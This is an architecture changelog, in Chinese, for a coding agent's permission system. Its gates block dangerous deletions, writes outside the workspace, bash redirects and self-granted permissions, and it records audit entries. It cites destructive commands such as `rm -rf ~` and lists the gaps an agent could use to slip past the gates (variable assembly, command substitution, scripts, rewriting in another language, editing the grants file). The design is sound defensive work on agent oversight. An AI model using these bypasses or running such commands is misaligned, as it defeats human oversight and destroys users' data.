# 📐 架构演进日志

> 记录每次**系统架构设计 / 升级 / 改良 / 重构**的变更。
> 与 CHANGE_LOG（一行一条的全量变更）互补：本文件专门沉淀"架构层面的演进"，每次变更写成一**块**。
>
> **记录范围**：设计新系统架构、对现有架构升级/改良/重构。不记录新增功能或 Bug 修复本身，
> 除非该改良同时解决了其中的部分问题（此时应在"面向的问题"中点明）。
>
> **格式**：每块含标题（时间 + 主题）、牵连系统/层次、面向的问题、做出的改动、解决的问题、未来可优化。
> 时间通过 `date` 命令获取系统当前时间，禁止估计。

---

<a id="log-2026-10-06-mcp"></a>

## 2026-10-06 15:25 | note_search 的进程边界升级为 MCP 协议：侧车从"私有 CLI"变成"标准 server"

**牵连系统/层次**：`sidecar/rag/mcp_server.py`（新增，协议信封）· `src/mcp/client.ts`（新增，零依赖 MCP 客户端）· `src/tools/builtin.ts` note_search handler（主路径切换 + 降级保留 + 渲染共用）· `scripts/verify-mcp-note-search.ts`（新增，第 67 套件）· `scripts/verify-tools.ts` G12（起子进程模块清单 2 → 3）。

**面向的问题**：MCP 化前 note_search 走"一把一 spawn"——每次检索冷启动一个 Python 进程（chromadb/openai 重 import 全额付费）、协议是私有一行 JSON（只有 flint 一个调用方，别的 MCP 客户端接不进来）；且"协议"没有握手/能力协商，server 端无法拒绝未初始化的请求。

**做出的改动**：① 侧车新增 `mcp_server.py`——纯标准库实现 MCP stdio 传输（newline-delimited JSON-RPC 2.0）：initialize 握手回 protocolVersion/capabilities、未初始化请求按规范 -32002 拒绝、tools/list 带 JSON Schema、tools/call 惰性加载重依赖（轻请求在索引库损坏时依然可用）、检索失败按 `isError:true` 回报不吞成协议错误；检索核心 `query.search()` **一行未改**——v1 预留的 JSON-RPC 形状兑现为只换信封。② 本体新增 `src/mcp/client.ts`——长驻连接（spawn 一次 + 握手，多次调用按 id 配对复用）、超时即杀连接（迟到响应会造成 id 错位，连接不可复用）、进程死亡自愈（下次调用重新握手）、stderr 只留尾部做诊断现场。③ note_search 双通道：MCP 为主、一把一 spawn 为降级，两条路产出同形状共用渲染——协议层单点故障不拖垮工具可用性。④ G12 的"起子进程模块清单"从两个更新为三个（builtin 3 处 / runner 1 处 / mcp/client 1 处）。

**解决的问题**：多轮检索免去重复冷启动；侧车成为任何 MCP 客户端可接的标准 server（不止 flint 自己）；协议纪律（握手、未初始化拒绝、能力协商）有了程序闸而非口头约定；G12 继续钉住"哪些模块有权起进程"的边界。

**未来可优化**：① client 目前只支持 stdio 单工具 server，接入第三方 MCP server（多工具、资源、sampling）时再评估泛化为连接管理器；② note_search 每会话首调用仍付一次冷启动（进程惰性 spawn），若成为体感可改为 Runtime 装配期预热；③ 增量索引（笔记变更后免全量重建）仍是侧车内部的独立课题。


<a id="log-2026-09-27-repo-status"></a>

## 2026-09-27 21:00 | 项目层"三半"合成演进为"四半"：仓库状态注入成为第四半

**牵连系统/层次**：`extensions/sections/project.ts`（注入层）· `registry/repo-status.ts`（注册表）· `probe/repo-status.ts`（探针）· `summarize/repo-status.ts`（纯视图）· 受影响 `verify-stack.ts` E10 / `verify-commands.ts` F10（把"三半"断言改为"四半"顺序断言，项数维持 72/82，红→绿不增不减）。

**面向的问题**：模型不知道自己当前在哪条分支、领先/落后远端多少、工作区有没有脏文件，每次都要靠 `bash "git status"` 现猜。

**做出的改动**：project 层现状快照的合成从"现状 + 技术栈画像 + 命令表"三半扩成"现状 + 技术栈画像 + 命令表 + 仓库状态"四半；仓库状态为**可选半**——非 git 仓库整半缺席。probe 复用 `git.ts` 的 `parseStatus`（零新增依赖）；注册表播种时一次性写入，运行期不回读。

**解决的问题**：一进门即知"在哪条分支 / 领先落后多少 / 脏不脏"，且与 `git` 工具同源数据，不另造一套 git 解析。

**未来可优化**：若日后需要"运行期实时重注"，再评估是否接入 onChange（当前刻意不做，见 DECISION_LOG `log-2026-09-27-repo-status`）。


<a id="log-2026-09-24-read-guard"></a>

## 2026-09-24 20:55 | read 的体检接进扫描遍历的同一份判定：`search` 层第一次向 `tools` 层输出一个共享判据函数

**牵连系统 / 层次**：`src/search/walk.ts`（二进制判定式抽成导出函数 `headIsBinary`，`readForScan` 内部改调它 —— 行为零变化）· `src/tools/read-guard.ts`（**新增**：分类 `classifyRead` / 渲染 `renderReadNotice` / 接线便捷式 `guardForRead` / 头部探针 `readHeadBytes`，只 import walk 的判据与窗口常量）· `src/tools/builtin.ts`（read handler 在 `statSync` 之后、`readFileSync` 之前接线一处）· `scripts/verify-read-guard.ts`（**新增 38 项**）

**面向的问题**：read 对任何文件整个读进来——二进制灌乱码进上下文，大文件整个吞内存；grep/symbols 那条路早有同款体检，read 走"点名单个文件"的门一直没接。最省事的写法是在 read handler 里再判一遍——那正是 10.7.3 批评过的"两处各抄一份"。

**做出的改动**：不新写判定，把 walk.ts 的二进制判定式**抽成导出函数**（`headIsBinary`），`readForScan` 改调它（回归套件 B 段钉住行为零变化）；新增 read-guard 作分类 / 渲染 / fail-open 的落点，read handler 只剩一行接线。**层次方向是"search → tools"的判据输出**：walk.ts 本就是"探针"模块（碰 fs、不放策略），headIsBinary 是其中唯一纯判定的那一格；read-guard 接着它做 read 语境的策略（整读 vs 分段、次序、出路文案），不复制判定式。

**解决的问题**：误读二进制不再灌乱码（乱码内容一字不进上下文，只回"多大 / 为什么没读 / 怎么办"）；整读超限被点名分段（分段路径零扰动）；grep/symbols 的体检口径与 read 严格同源，改一处两边生效。

**未来可优化**：若将来 read 要支持按扩展名的**提示性**建议（如"这看着像图片，也许你想要的是……"），名单可放渲染层做注解，判定仍以 NUL 探测为准；`readHeadBytes` 与 `readForScan` 各自开文件读头部，若将来遍历器也改成"stat 先行"可合并探针（现下两者语境不同，刻意不共享 IO）。

---

<a id="log-2026-09-24-file-ledger"></a>

## 2026-09-24 15:04 | 压缩链路长出"清单通道"：compaction entry 第一次同时承载散文摘要与结构化清单，`core` 存储契约用结构子类型避开 llm 依赖

**牵连系统 / 层次**：`src/context/file-ledger.ts`（**新增**，判据纯函数：抽取 / 合并 / 渲染 / 成文，零 import）· `src/core/compaction.ts`（`FileLedger` 类型 + `CompactionResult.ledger?`）· `src/core/compaction-store.ts`（`getMsgById` 暴露 `tool_calls`、`getCompactions` / `appendCompaction` 带清单）· `src/context/compaction.ts`（`compactTo` 抽取合并入树、`maybeCompact` 每轮现读）· `src/session/jsonl-storage.ts`（`CompactionEntry` 加 `filesModified?` / `filesRead?`，**空清单不写字段**）· `src/runtime/runtime.ts`（摘要层经 `glueSummaryLedger` 唯一拼接点）· `scripts/verify-file-ledger.ts`（**新增 39 项**）

**面向的问题**：摘要由 LLM 散文生成，压缩几轮后"改过哪些文件"这类可操作信息漂移丢失；而它是编程 Agent 最需要的那类窄信息（体积恒定、丢不得也编不得）。

**做出的改动**：清单与摘要**分离**——散文归 LLM、清单归程序。entry 同时承载两种载体（结构化字段不托付给摘要模型）；渲染只在 runtime 摘要层一处出口，`[对话摘要]` 历史消息刻意不加（不放大 F 的双发）；`getMsgById` 的 `tool_calls` 用**结构子类型**（`{ function: { name, arguments } }`）而非 import `LLMToolCall`，**core 层保持零 llm 依赖**——契约定义的是"压缩需要看的两格"，不是工具调用的全貌。

**解决的问题**：压缩逐层累积后模型仍知道本会话碰过哪些文件；旧格式文件照常加载（字段缺省）、无工具调用的压缩不写字段（不是空数组）。

**未来可优化**：trash 目前的"改写桶"语义偏宽（移进回收站 ≠ 内容改写），若将来要区分"删过"需第三桶；bash 写仍看不见（与 10.9.8 同一条边界账）。

---

<a id="log-2026-09-24-bash-write"></a>

## 2026-09-24 14:23 | `before_tool_call` 从六道闸变七道闸：bash 的重定向写第一次被翻译出来送进同一条边界，`permission/` 长出"翻译型闸"

**牵连系统 / 层次**：`src/permission/bash-write.ts`（**新增**，提取判据——纯函数，复用 `danger.ts` 词法与 `workspace.ts` 边界）· `src/harness/main.ts`（钩子链第七道闸，`homedir()` 现取）· `scripts/verify-bash-write.ts`（**新增 55 项**）

**面向的问题**：
- 工作区闸只认 write / edit 的 `path` 参数；bash / spawn 的重定向目标藏在**命令串**里，`echo x > ~/Desktop/a.txt` 没人查——"换个门"即可绕过整条边界。
- 直接把 bash 塞进受管名单不可行：工作区闸的输入契约是"path 字格"，bash 没有那一格。

**做出的改动**：
- 新增**翻译型闸**：提取目标（重定向符封闭枚举 + `tee` / `cp` / `mv` 命令词）→ `expandTarget` 归一（`~` / `$HOME` / `%USERPROFILE%`，**含 Windows**；**MSYS 不映射**，与 danger.ts 相反——cmd 真落点方向不可假放行）→ 复用 **`isOutsideWorkspace` 同一个判定函数**。边界规则一份，改一处两边生效。
- 伪目标（`/dev/null` / `NUL` / 流重定向）与判不出的形态（变量 / 反引号 / 通配）一律放行；拒因四样齐全（没执行 + 两扇门一个规矩 + 出路 + 护栏不是沙箱）。
- 排在工作区闸**之后**：同族边界闸，先让判据更确定的 write / edit 闸说话。

**解决的问题**：
- "换个门绕过工作区边界"的门从两扇收成一扇：write、edit、bash 重定向、spawn 重定向现在走**同一个判定函数**。
- `permission/` 的组织长出新形状：**翻译型闸**（命令串 → 目标 → 复用既有判定），与"命令词型闸"（危险 / 删除）、"路径型闸"（工作区）三足分开，互不抢理由。

**未来可优化**：
- `dd` / `install` / `rsync` 等写形命令词未收（先不猜）；`mv -t` 旗标吃参形态判不出。
- 符号链接真落点只对 write / edit 生效；bash 目标若要追，需把两步判 generalize，先不做。

---

<a id="log-2026-09-24-trash-gate"></a>

## 2026-09-24 13:06 | `before_tool_call` 从五道闸变六道闸：删除第一次从"不可逆"变成"可逆"，内置工具 19 → 20

**牵连系统 / 层次**：`src/permission/trash.ts`（**新增**，删除改道判据——纯函数，复用 `danger.ts` 的词法）· `src/tools/trash-bin.ts`（**新增**，唯一碰 fs 的落点：移入 / manifest / 还原 / 清理）· `src/tools/builtin.ts`（+`trash` 工具，内置工具 19 → 20）· `src/commands/builtin/undo.ts`（**新增**，`/undo` 栈式还原）· `src/harness/main.ts`（钩子链插入**删除改道闸**，排在危险闸之后、工作区闸之前）· `src/loop/plan-mode.ts`（`PLAN_BLOCKED_TOOLS` + `trash`）· `scripts/verify-trash.ts`（**新增 59 项**）

**面向的问题**：
- 危险闸只认"灾难形态"，够不上的删除（`rm -rf src/`、删单个文件）**放行且不可逆**——项目自己登记在案"只有 L1 没有 L2"。
- 三道既有闸的出路全是"让用户去办"（去自己终端 / 敲 `/workspace allow`），模型被拒之后手里**没有合规的路**可走。

**做出的改动**：
- 钩子链新增一道**改道闸**：bash / spawn 命令的段首命中七个删除词、且目标"该拒"（工作区外 / 项目根 / 回收站自己）→ deny，拒因指路 `trash` 工具；形状判不出（变量拼装、换语言重写）照旧放行——**护栏不是沙箱**，与危险闸同一口径。
- 真删除收口为**唯一落点** `trash-bin.ts`：移进 `.flint/trash/<时间戳>/` 且**保留原目录结构** + manifest 记账（原路径 / 字节）；还原**栈式**、`OCCUPIED` 两边都不动；清理超期才清、时间读不出**一律不清**。
- `trash` 与 `/undo` 各自进场：工具要权限确认（按工具身份回答"会不会改用户文件"）、命令层零 fs（全走 trash-bin）。

**解决的问题**：
- "删除"第一次有了回滚基线（回收站本身），10.9.2 登记的"只有 L1"缺口补上一半。
- 模型被拒后第一次有**自己能走**的合规出路；`/undo` 给用户同一条路的反向版本。

**未来可优化**：
- `mv` 到工作区外仍是"写"不是"删"，不在本闸范围；真要管得先解决"bash 目标路径判读"这个老问题。
- 回收站只按时间清理，不看体积；`/undo` 只有栈顶视角，没有列表视图（`/trash list` 候选）。

---

<a id="log-2026-09-19-audit"></a>

## 2026-09-19 12:11 | 护栏层长出第一个**只写不读**的旁路：审计留痕落地，四个调用点收敛到一个 sink

**牵连系统 / 层次**：`src/permission/audit.ts`（**新增**，统一落点）· `src/eventlog/store.ts`（加 `recordAudit`，与 `addNarrative` / `recordTaskArchive` / `recordCompaction` 同一个 `appendLine` sink）· `src/harness/main.ts`（钩子链，`deny()` 里记一笔）· `src/runtime/runtime.ts`（`askPermission`）· `src/commands/builtin/workspace.ts`（`allow` / `clear`）

**面向的问题**：
- **三道护栏都在工作，但动作本身不留痕**：拦下就拦下了、放行就放行了 —— 事后既查不到"这一周被拦过几次、都是哪一类"，也查不到"这个目录是谁、什么时候开的门"。10.9.2 / 10.9.3 / 10.9.1 前半各自把"拦得住"做完了，"查得到"一直空着。
- **拦下这件事有两个相反方向的失败**：漏记（该留的没留）与**多记**（每次正常调用都留一条）。后者更隐蔽——它不报错，只是把真事件淹掉。
- **同一个动作可能在四处被记**（钩子链 / 弹窗 / 命令层两条分支），各写各的字面必然出现"同一件事两种写法"，而检索时就是两拨结果。

**做出的改动**：
- 新建 `src/permission/audit.ts` 作**唯一落点**：`recordGateDeny` / `recordGrant` / `recordRevoke` / `recordPermissionChoice` 四个函数，把"这次动作算审计里的哪一种、写什么字"收在一处；三个调用方各只剩一行。条目组装与落盘仍归 `eventlog/store.ts` 的 `recordAudit`（**不新开文件**，扩 `system` 这一类）。
- 记账范围收到**边界决定**四类：被闸拦下 · 用户拒绝 · 用户选「本次全部允许」 · 放行/收回目录。一次性的"允许"与正常执行的调用**不记** —— 后者已由 `tool-calls.jsonl` 流水全量记下（**含被拦的那些**：钩子拒了工具就不执行，但 `start` / `end` 成对发过，span 照样收束）。
- **拉通道**：条目只落 `events.jsonl`，靠 `/events` / `search_events` / `pull_events` 主动拉，**不进任何读路径**（`src/context` 全层零 `eventStore` 引用，G1 钉住）。
- 目标摘要按**参数形状**取（`path` 优先于 `command`，挑不出来兜底整串 JSON），与工具名解耦；截断沿用流水的 **200 字上限**，不新增泄露面。
- 拒因只留**首行**：那封几百字的"三条出路"教学信是递给模型的，查账的人只要"为什么被拦"。
- 落盘失败**静默**（审计是旁路，反噬主流程比记不上更坏），但**授权类**的写盘失败要如实写进 `reason`（"已生效、只是没长期化"必须说清楚——谎报比漏记更坏）。

**解决的问题**：
- 护栏第一次有了"**事后可复盘**"这一面：`/events` 直接给出"谁在什么时候拦住过什么、谁开过哪扇门"。
- 把"记什么不记什么"从四处各自的直觉变成**一处判据**，同时消掉了"同一动作两种字面"的漂移风险（H5 钉住全仓只有一处调 `recordAudit`）。
- 明确了一条**以前没有明说的架构界线**：审计是**只写不读的旁路**，它的消费者是人、不是模型；因此它刻意不接入提示词组装 —— 被审计的一方若能实时看到自己被拦了几次，留痕就变成了行为训练信号。

**未来可优化**：
- 条目**不带 `turnId`**（钩子载荷里没有它），要按轮次复盘得按时间窗回流水翻；真需要时可以给钩子载荷加字段，但那要动钩子契约，先不做。
- 没有**告警 / 阈值**（"一小时内被拦 5 次就提醒"）——那会把审计变成监控，当前没有证据表明需要。
- 10.9.1 的**后半**（`PermissionManager` allowlist 整体持久化）落地时，它的授权动作也应走这一份 sink，而不是另起一套。

---

<a id="log-2026-09-18-grants"></a>

## 2026-09-18 | 授权状态从"进程内"变成"跨进程"：`permission/` 第一次拥有自己的磁盘命名空间，播种从"只清"改成"先清后栽"

**牵连系统 / 层次**：`src/permission/grants.ts`（**新增**：`loadGrantsFile` / `persistedGrants` / `persistGrant` / `forgetGrants` / `resetGrantsFileCache` —— **零第三方依赖**，只 import `node:fs` / `node:path` + `GLOBAL_DIR` + `normalizeProjectPath`）· `src/permission/workspace.ts`（新增批量栽种 `fill(dirs, cwd)`；拒因**不再提** `--save`）· `src/commands/builtin/workspace.ts`（`/workspace allow [--save]` / `clear`，**盘上文件的两个写接口只有它在调**）· `src/harness/project-context.ts`（`seedProjectContext()` 从 `clear()` 改成 `clear()` + `fill(persistedGrants(项目键))`）· `scripts/verify-grants.ts`（**新增 83 项**）· `WorkBuddy_Test/mutate-grants.mjs`（25 轮变异）· `WorkBuddy_Test/demo-grants.ts`（端到端演示）。

**面向的问题**：
- **授权只在进程内存活**：`/workspace allow` 把目录记进单例，进程一退就没了 —— 用户每次开新会话都要把同一串目录重打一遍。10.9.3 交付的是"边界存在且当场生效"，缺的是"长期信任"这一半（ROADMAP 10.9.1 的相应部分）
- **落盘一旦做错就是自授权通路**：闸管的正是"写"，而模型的 `write` 工具**能改到** `~/.flint/` 下的文件。任何"每次调用重读配置文件"的写法，都等于让模型可以通过改文件给自己发授权
- **旧项目取得的许可不许跟着搬**（10.9.3 已立的纪律）在这里必须被**推广**：会话内的许可是"清掉"就够，盘上的长期许可却不能一刀切清掉 —— 它是**本项目自己**的，清完得再把本项目那份栽回来。切到空项目时必须验得到"清干净了"

**做出的改动与关键口径**：
- **状态的生命周期从"进程内"扩到"跨进程"**：`permission/` 由此**第一次拥有自己的磁盘命名空间**（`~/.flint/permissions.json`），此前它只有内存态。这不是"多挂一个零件"，而是给一个**安全相关子系统**加了一层持久化：一旦有了盘上状态，就必然引出"谁读、谁写、读几次、读不懂怎么办"这一整套新问题（下面四条），而它们此前**不存在**。按收录判据（结构变没变）记这一块，理由就是这层新的持久化边界
- **读一次（启动时读进内存快照，运行期不再读盘）**：这是本条最承重的边界。它把"模型改文件 → 下次调用拿到新授权"这条自授权通路**从根上掐掉**（改文件不生效，得重启，而重启是人的动作）。切换项目也只从**同一份快照**里按项目键取，不触发第二次读盘。同型先例：`PermissionManager` 的配置"只在启动读一次"、`postcheck` 的配置"只在启动读一次"
- **读不懂：退化成空 + 拒绝覆盖（两件事，缺一不可）**：坏 JSON / 形状不对 / `version` 认不出都当"没有授权"；同时记 `loadError`，此后两个写接口**一律拒写**。只做前一半会漏掉后者 —— "退化"之后若照常写盘，就把**别的项目**的条目整体抹掉了。**这是与 `ProjectRegistry` 静默失败刻意相反的一处分野**：那类文件坏了顶多少记一条，授权文件坏了乱写是在削安全边界
- **播种：`clear()` → `clear()` + `fill(本项目)`,顺序承重**：`fill` 内部**只调 `allow`、不自己 clear`**，所以顺序反了（先 fill 后 clear）就等于"每次播种都清空"。这延续了 10.9.3 那条"先清后栽"的靶子构造，并把它的语义从"清掉上一个项目的"扩成"清掉上一个项目的、再栽回本项目盘上那份"
- **写入口只在命令层**：`persistGrant` / `forgetGrants` 的调用方**只有** `commands/builtin/workspace.ts`（G5 逐字钉住）；`fill()` 的唯一调用方是播种（G7）；`resetGrantsFileCache()` 零生产调用方、**只为测试存在**（G4）—— 否则"读一次"这条边界会被测试钩子绕过
- **默认不落盘**（`--save` 才落）：不是实现细节而是**架构口径** —— 与权限弹窗"本次全部允许**不许**被截断"同族，任何一次授权都不该在用户不知情时变成永久许可。`allow` 不带 `--save` **绝不写盘**（E1/E5/E13 钉住）
- **文件按项目分区**（`{ version, projects: { <归一化项目键>: { write: [...] } } }`，键与 `ProjectRegistry` 同一把尺）：`clear` 实现成**读-改-写**、只删**本项目那一个键**，不是整体覆盖 —— 否则 A 项目的 `clear` 会越权跨项目清掉 B 的授权

**解决的问题**：
- "长期信任某个目录"成为可能：`allow --save` 之后**重启仍在**（H4/H5 在真"重启"里验），而撤销**跨得过重启**（`clear` 同时清内存与盘上本项目条目）。所拦/所放的都是同一个安全格，之前是"会话级"、现在是"会话级 + 可选的长期级"
- 落盘这个动作本身**不产生新权限**：写文件不生效（读一次）、读不懂不启用也不覆盖、写失败看得见（返回错误串，命令层印给用户）—— 三条边界合起来使"加一层持久化"没有削弱 10.9.3 立下的边界
- 顺带逼出一处**跨次教训的第三次应验**：源码文本断言**误伤注释**（`grants.ts` 注释里提到 `workspaceGrants.allow()` 让 G13 变红）—— 仓库史上第 8 次，处置与先例一致（断前先 `stripComments`）

**未来可优化**：
- **ROADMAP 10.9.1 的另一半（权限 allowlist 整体持久化）仍未做**：本条只取了"工作区授权"这一半，`PermissionManager` 的 allowlist 落盘依旧被 **C1 冲突**挡着（2026-09-04 的"刻意不做"）。两半的分野写在 DECISION_LOG 的 `log-2026-09-18-grants` 决策一
- **没有"跨项目视图"**：不提供列出所有项目授权的命令（属 10.11 通讯录那块）；本模块只管本项目的键
- **不做失效清理**：目录被删了条目仍留着 —— 授权是"信任这个路径"的声明，路径暂时不存在不等于该撤销
- **文件形状的演进靠 `version` 认**，认不出即退化 + 拒写；将来真要迁移得写迁移器，目前刻意不做

---

<a id="log-2026-09-18-workspace-gate"></a>

## 2026-09-18 | `before_tool_call` 从三道闸变四道闸：工作区外写保护进场，安全闸第一次管"落点"而不止"命令形态"

**牵连系统 / 层次**：`src/permission/workspace.ts`（**新增**：判据 `isUnder` / `isOutsideWorkspace` + 适配器 `guardWorkspaceWrite` + 拒因 `renderWorkspaceReason` + 授权表单例 `workspaceGrants` —— **零项目依赖**，只 import `node:path`）· `src/commands/builtin/workspace.ts`（**新增**：`/workspace` 命令，**授权表的唯一写入者**）· `src/harness/main.ts`（`before_tool_call` 钩子链插入**第三道闸**，**排在危险闸之后、git 路由之前**）· `src/harness/project-context.ts`（`seedProjectContext()` 里 `charterLock.lock()` 旁新增 `workspaceGrants.clear()`）· `scripts/verify-workspace.ts`（**新增 126 项**）· `scripts/verify-projects.ts`（+2 项：H12b / I8）· `WorkBuddy_Test/mutate-workspace.mjs`（28 轮变异）· `WorkBuddy_Test/demo-workspace.ts`（端到端演示）。

**面向的问题**：
- **`write` / `edit` 可以写任意路径，而权限弹窗挡不住它**：非 TTY / RPC 下权限**自动放行**（登记在案的已知边界）—— 那段路没有人在看。而 10.9.2 的危险闸只认"灾难形态"（删整棵树 / 写裸设备 / 关机重启），一条拼错的绝对路径或一个多余的 `../` 把文件落到项目外面，**形状上完全正当**，那道闸刻意不管
- **边界定义散落在工具里**：每个工具自己 `path.resolve`，没有一个统一的"这条路径算不算在我的工作区里"的判据 —— 于是"默认只许动 cwd 之内"这条最朴素的边界，此前**无处可挂**
- 一条被显式挂在条目上的约束：`⚠C2`（`tools/spec.ts` 刻意无数组形状，路径列表要数组参数）—— 立项时被认为会挡住本条

**做出的改动与关键口径**：
- **拦截链再加一环，变成四道**：`before_tool_call` 现在是 **① 契约锁 → ② 危险闸 → ③ 工作区闸 → ④ git 路由**。四者共用同一个位置（**权限弹窗之前**）与同一套契约（返回 `{action:'deny', reason}`）。**四道闸的域刻意不重叠**：契约闸管"哪个文件"（CHARTER）、危险闸管"命令长什么样"（三类灾难形态）、工作区闸管"落到哪"（cwd 之内 vs 之外）、git 路由管"把它交给谁"（同名只读命令的引导）—— H10–H13 在真总线上逐条证明新加的那一环**没把前三环挤掉**
- **安全闸第一次管"落点"而不止"命令形态"**：前两道闸都看**输入长什么样**（文件名 / 命令串），这道闸看的是**动作会落到哪里**。代价是它必须**只认有明确 `path` 字段的工具**（write / edit），因为一旦要解析命令串里的目标，就会重蹈"读与写长得一模一样"（决策四）—— 这是"判据完备"这条纪律的一次**主动让步**：判据不完备时把这一格**留白并标注**，不去写一个会误报的判据
- **"授权"走一条与权限子系统**完全独立**的通道**：授权表 `workspaceGrants` 是 `src/permission/workspace.ts` 里的一个单例，**唯一写入者**是 `/workspace` 命令（用户手打），模型自己碰不到。这么切的根因是**权限弹窗在非 TTY / RPC 下自动放行** —— 把边界接到弹窗上等于接了个静默失效的开关。同族先例是契约锁的 `/charter unlock`
- **与"项目切换"的接线**：授权存的是**绝对路径**（不随 cwd 变），所以 `seedProjectContext()` 里与 `charterLock.lock()` 并排 `workspaceGrants.clear()` —— 同一条纪律"凡在旧项目取得的许可都不跟着搬"。这一处**只有切到一个空目录才验得到**（`verify-projects.ts` 沿用"先清后栽"的靶子构造），且额外钉了源码侧（I8）防"手清那半被删还碰巧全绿"
- **失效方向一律朝"放行"倒**：非受管工具、args 形状不对、`path` 不是字符串 —— 全部 `undefined`（fail-open），交回主流程。同 `decodeDeny` / `guardDangerousCommand` 的口径

**解决的问题**：
- "写文件落到项目外面去"从一个**静默动作**变成**当场被拒、并告诉用户怎么开门**（拒因里带 `/workspace allow` 指引）。所拦的正是权限弹窗够不着、而危险闸又不管的那一格
- C2 的阻塞被**证伪**：开门走的是**命令层**（用户手打），不碰**工具层**的 `spec.ts` —— 与 10.8.1 同型。这条教训（"看着要扩协议时先问属于哪一层"）第二次应验，已回写进 ROADMAP 的 C2 条目
- 顺带把两处**只有跑真件才现形**的东西钉住：`target.trim() === ''` 那条分支是**死代码**（空白路径经 `path.resolve` 之后仍在 cwd 之内 —— 由"变异全绿 → 转探针取证"证明后删除）；以及**套件崩在半路与"没跑到"长得一样**（非字符串路径不挡的话 `path.resolve(cwd, 42)` 会抛，汇总行不出来），故适配器加了 try/catch 自守、变异脚本也要能区分"崩溃"与"未命中预期"

**未来可优化**：
- **只有 L1**，所以经 `bash` 的外写一律不拦（判据不完备时留白，见上）
- **不做路径语义归一**：`~` 不展开、MSYS `/c/…` 不认（与 read / write 同口径），`/c/Users/…` 会被判"在外面"——是**看得见的拒绝**而非静默错写
- **只在 flint 进程内、只对经模型之手的写入有效**：用户自己在别的终端里写文件它管不着；它管的是"写"不是"删"（删归危险闸，且那条只挡灾难形态）

---

<a id="log-2026-09-18-danger-gate"></a>

## 2026-09-18 | `before_tool_call` 从两道闸变三道闸：危险命令拦截进场，安全闸第一次有了"不可逆"这条判据线

**牵连系统 / 层次**：`src/permission/danger.ts`（**新增**：判据 + 适配器 + 拒因渲染 —— `findDangerousCommand` / `guardDangerousCommand` / `renderDangerReason` + 六张黑白名单常量，**零项目依赖**）· `src/harness/main.ts`（`before_tool_call` 钩子链插入第二道闸，**排在契约闸之后、git 路由之前**）· `scripts/verify-danger.ts`（**新增 172 项**）· `WorkBuddy_Test/mutate-danger.mjs`（33 轮变异）· `WorkBuddy_Test/demo-danger.ts`（端到端演示）。`src/permission/` 此前只有 `manager.ts`（授权键）一个文件，本条给它加了第一个**判据型**模块。

**面向的问题**：
- **权限弹窗够不着的地方，恰恰是最不可逆的那些命令**：① 非 TTY / RPC 模式下权限是**自动放行**的（登记在案的已知边界），那里没有人在看；② bash 的授权键是**完整命令串**，用户点过一次"本次全部允许"，同一条命令再来一次就不再弹。而"程序闸先于人闸、判据必须完备"这条纪律（`tool-hooks` 那次定下的）在**不可逆**的命令上比在契约上更硬
- **契约锁只堵了一扇自己的门**：2026-09-15 把契约锁那扇敞着的 bash 门堵上了，但那解决的是"有人偷改目标文档"，不是"有人顺手把整棵树删掉"。10.9.2 原话里的"模式黑名单 + 二次确认"一直没有判据
- 一条被显式挂在条目上的约束：`⚠C7` —— `decodeDeny` 只有"放行 / 拒绝"两态，装不下"让我确认一下"

**做出的改动与关键口径**：
- **拦截链多了一环，而且是"安全闸先于引导闸"这条既有次序的延伸**：`before_tool_call` 现在是 **① 契约锁 → ② 危险闸 → ③ git 路由**。三者共用同一个位置（**权限弹窗之前**）与同一套契约（返回 `{action:'deny', reason}`）。这一次序此后是**被钉住的**：G3 钉源码文本先后、H13 在真总线上钉行为级先后（同一条命令同时命中契约闸与危险闸时，**契约闸先给理由** —— 因为它的判据更窄更确定，能给出更具体的解锁指引）
- **"判据完备"这条纪律第一次按"可逆 / 不可逆"分层**：契约锁有两层（L1 事前字面闸 + L2 事后效果闸），危险闸**只有 L1** —— 删除不可逆，事后没有任何东西可以比对、可以回滚。这不是少做一层，而是**判据方向的前提**：它把这条闸的目标从"拦住所有危险"改成"**宁可少拦不可误拦**"（误拦会让人把闸关掉，比漏拦更坏）
- **判据 / 适配器 / 文案三分的模块形状与既有安全闸同形**：纯函数判据（cwd / home / platform **注入而非直读**，套件才能造真目录、逐形状打靶）· 钩子形状的适配器（与 `charter.ts` 的 `guardContractWrite` 同一位置关系）· 给模型读的教学拒因（说清"没跑"、命中哪一类、为什么不可逆、三条出路、以及**"这是护栏不是沙箱"**）
- **一条"反区域"的来源边界**：本模块只看 `bash` 工具的 `command` 串，**不碰** `write` / `edit`（那是契约锁的域）、**不碰**工作区边界（那是 10.9.3 的域）。刻意不做的清单写进了文件头与拒因 —— **不声称挡得住绕过**（变量拼装、命令替换、写进脚本、换语言重写）
- **失效方向一律朝"放行"倒**：非 bash 工具、args 形状不对、命令词判不出来、目标解不出绝对路径 —— 全部 `undefined`（fail-open），交回主流程。同 `decodeDeny` 的口径

**解决的问题**：
- "顺手写出来的一条命令把机器 / 项目毁掉"这件事，从**依赖用户手快**变成**程序先挡**，且在弹窗之前就把用户挡在门外（用户根本不会被打扰）
- C7 的卡点**被绕开而不是被推翻**：三态契约没造，靠"拒 + 教学理由 + 给他自己的终端这条路"落地。C7 本身未解，只是不再是本条的前置 —— 这类"**约束不等于必须解**"的判断值得复用：先问"这条约束针对的那个能力，真的需要吗"
- 顺带确认了两处**只在真跑时才现形**的东西：`rm -rf ~` 的拒因文案（家目录恰是 cwd 祖先时被"祖先"先接住 → 改成取**最具体**的那条身份）、以及三处"断言看着绿其实没打靶"的形态（判据漏校验命令词 / 标题与断言不符 / 挪 cwd 挪到了 tmpdir 而这个 tmpdir 就在家目录下）

**未来可优化**：
- **只有 L1**，所以 L1 漏了就是漏了（不可逆命令的固有代价，写在文件头）
- **可能过度拦截一处**：`rm -rf /s` 判成 S 盘根（MSYS 展开的副作用，与"认 `/c`"是同一枚硬币的两面）
- **可能漏拦**：变量拼装 / 命令替换 / 脚本 / 两层以上包装 / 另一种语言重写；家目录里的其他目录（10.9.3 的活）
- **C7 仍在**：真要"让我确认一下"（而不是直接拒），得把 `decodeDeny` 扩成三态

<a id="log-2026-09-17-at-file"></a>

## 2026-09-17 | 输入预处理通道从"空置"变成"在用"：`@file` 引用进场，`runtime.onInput()` 有了第一个真实消费者

